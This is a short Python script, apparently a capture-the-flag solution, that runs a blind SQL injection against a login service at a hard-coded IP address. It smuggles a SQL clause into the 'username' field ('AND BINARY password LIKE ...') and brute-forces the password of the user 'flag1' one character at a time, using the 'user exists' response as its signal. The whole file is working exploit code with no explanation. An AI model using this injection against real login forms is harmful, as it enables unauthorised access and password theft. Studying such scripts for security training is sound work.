#!/usr/local/bin/python3

import requests

url = "http://54.254.115.115:5001"

chars = "abcdefghijklmnopqrstuvwzyxABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890+/="

seen_chars = list()
while True:
  for c in chars:
    print(f"try: {c}")
    r = requests.post(url, data = {
      "username": 'flag1" AND BINARY password LIKE "' + "".join(seen_chars) + c + '%" # '}
    )
    content = r.text
    if "user exists" in content:
      seen_chars.append(c)
      print("".join(seen_chars))
      break
